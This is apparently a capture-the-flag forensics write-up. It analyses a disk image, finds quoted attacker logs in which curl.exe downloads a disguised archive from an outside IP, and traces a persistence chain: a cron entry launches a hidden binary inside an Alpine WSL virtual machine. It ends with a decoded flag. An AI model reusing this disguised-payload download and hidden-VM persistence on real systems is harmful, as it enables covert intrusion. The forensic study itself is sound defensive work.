# Between The Lines

Co-authors: @Eki

Extract the E01 file content:

```shell
7z x BetweenTheLines.zip
ewfmount BetweenTheLines.E01 mnt
cp mnt/ewf1 .
umount mnt
sudo losetup -P -f ewf1
sudo mount -o ro /dev/loop0 mnt
```

Under `C:\ProgramData`, we found something suspicious:

`WindowsUpdateTask_D.tmp`:

```
Microsoft Windows [Version 10.0.26200.7171]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>curl.exe http://192.168.148.129:8080/Intersteller.mp4 -o C:\ProgramData\E.rar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  119M  100  119M    0     0   714M      0 --:--:-- --:--:-- --:--:--  718M

C:\Windows\System32>
```

`WindowsUpdateTask_Z.tmp`:

```

RAR 7.13 x64   Copyright (c) 1993-2025 Alexander Roshal   28 Jul 2025
Trial version             Type 'rar -?' for help

Extracting from C:\ProgramData\E.rar

Creating    C:\ProgramData\Microsoft\AppV\app\WSL                     OK
Creating    C:\ProgramData\Microsoft\AppV\app\WSL\Virtual Hard Disks  OK
Extracting  C:\ProgramData\Microsoft\AppV\app\WSL\Virtual Hard Disks\WSL.vhdx  OK
Creating    C:\ProgramData\Microsoft\AppV\app\WSL\Virtual Machines    OK
Extracting  C:\ProgramData\Microsoft\AppV\app\WSL\Virtual Machines\B33C962D-45FD-4650-A5C2-88295D7B4E43.vmcx  OK
Extracting  C:\ProgramData\Microsoft\AppV\app\WSL\Virtual Machines\B33C962D-45FD-4650-A5C2-88295D7B4E43.vmgs  OK
Extracting  C:\ProgramData\Microsoft\AppV\app\WSL\Virtual Machines\B33C962D-45FD-4650-A5C2-88295D7B4E43.VMRS  OK
Creating    C:\ProgramData\Microsoft\AppV\app\WSL\Snapshots           OK
All OK
```

So it extracted a rar file downloaded into a WSL virtual machine. Examine the vhdx file:

```shell
qemu-img convert -O raw WSL.vhdx WSL.img
sudo losetup -P -f WSL.img
sudo mount /dev/loop1p3 mnt
```

Under the root, we found an Alpine system. To find what has changed, we wrote a small utility to check integrity (`apk verify` does not work somehow in the chroot):

```python
import base64
import os
with open("mnt/lib/apk/db/installed", "r") as f:
    for line in f:
        if line.startswith("F:"):
            folder = line[2:].strip()
        elif line.startswith("R:"):
            path = folder + "/" + line[2:].strip()
        elif line.startswith("Z:Q1"):
            checksum = line[4:].strip()
            if not os.path.islink("mnt/" + path):
                print(base64.b64decode(checksum).hex(), path)
```

```shell
python3 check.py > checksum
cd mnt
sha1sum -c ../checksum > ../log
```

We found:

```
etc/crontabs/root: FAILED
```

Its content:

```
20 */4 * * * /bin/alpine_init
```

Read `/bin/alpine_init`:

```
#!/bin/sh
date > /tmp/date
nohup /bin/init_tools > /dev/null 2>&1 &
```

Found base64 in `/bin/init_tools`:

```shell
$ strings bin/init_tools
QkhGbGFnWXs3ZmIzOTdmYmNkZmUyNGUwZjMyYmVhNGExY2JmNTAzYX0g
$ echo "QkhGbGFnWXs3ZmIzOTdmYmNkZmUyNGUwZjMyYmVhNGExY2JmNTAzYX0g" | base64 -d
BHFlagY{7fb397fbcdfe24e0f32bea4a1cbf503a}
```
